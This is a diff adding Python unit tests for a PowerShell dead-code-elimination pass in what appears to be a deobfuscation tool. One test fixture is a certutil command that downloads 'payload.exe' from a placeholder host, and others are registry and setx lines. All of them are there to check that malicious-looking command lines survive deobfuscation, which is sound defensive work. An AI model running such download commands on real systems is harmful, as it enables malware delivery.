@@ -498,3 +498,35 @@ class TestPs1DeadCodeExtra(TestPs1):
             'while ($True) { $x = 1; if ($c) { break }; $y = 2; break }',
             Ps1DeadCodeElimination)
         self.assertIn('while', result.lower())
+
+
+class TestPs1InjectedNoiseBareword(TestPs1):
+    """
+    The bareword rule deletes a statement and the `try` around it on a guess about an obfuscator
+    artifact. What separates the artifact from a command line is that the artifact is a mis-lexed
+    two-token assignment and nothing else, so a real invocation — which carries operands — has to
+    survive even when one of its arguments happens to start with `=`.
+    """
+
+    def test_an_assignment_residue_is_dropped(self):
+        for source in ('0042DsKaho=8602057', 'Zbc =1', 'aQ=2'):
+            with self.subTest(source):
+                result = self._apply(
+                    F"try {{ {source} }} catch {{ }}\nWrite-Host 'keep'",
+                    Ps1DeadCodeElimination)
+                self.assertEqual(result, "Write-Host 'keep'")
+
+    def test_a_native_command_line_survives_an_equals_argument(self):
+        # Regression: any argument beginning with `=` marked the whole invocation as noise, which
+        # erased exactly the `try { <LOLBin> } catch { }` shape the rule was rewritten to protect.
+        for source in (
+            'certutil -urlcache -split -f =http://host/payload.exe',
+            'findstr = C:\\log.txt',
+            'reg add HKCU\\Software\\X /v Y /t REG_SZ /d =Z',
+            'setx EVILVAR =1',
+        ):
+            with self.subTest(source):
+                result = self._apply(
+                    F"try {{ {source} }} catch {{ }}\nWrite-Host 'keep'",
+                    Ps1DeadCodeElimination)
+                self.assertIn('try', result)
